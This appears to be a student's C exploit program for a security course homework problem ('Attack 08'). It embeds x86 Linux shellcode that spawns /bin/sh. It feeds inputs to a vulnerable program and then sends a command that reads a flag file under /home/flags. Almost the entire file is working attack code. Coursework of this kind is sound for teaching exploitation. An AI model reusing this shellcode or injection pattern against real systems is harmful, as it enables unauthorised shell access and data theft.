/* 
 * Attack 08 - Fill out this program to implement your attack for Problem 8
 */

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  char attack[] = "\xeb\x1d\x5b\x89\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\x89\xc3\x40\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41";


  char command [] = "cat /home/flags/hw02/flag08.txt > flag08.txt";
  puts("21");
  fflush(stdout);
  sleep(1);
  puts("123456");
  fflush(stdout);
  sleep(1);
  puts(attack);
  fflush(stdout);
  sleep(1);
  puts(command);

  return 0;
}
